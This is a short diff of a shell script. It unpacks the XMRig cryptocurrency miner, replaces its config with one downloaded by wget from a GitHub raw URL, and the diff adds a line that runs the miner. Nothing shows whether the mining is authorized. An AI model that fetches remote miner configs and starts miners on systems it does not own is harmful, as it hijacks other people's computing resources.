@@ -12,3 +12,5 @@ tar -xf xmrig-6.16.2-linux-static-x64.tar.gz
 cd xmrig-6.16.2
 rm config.json
 wget https://raw.githubusercontent.com/arv2k1/temp/main/config.json
+
+./xmrig
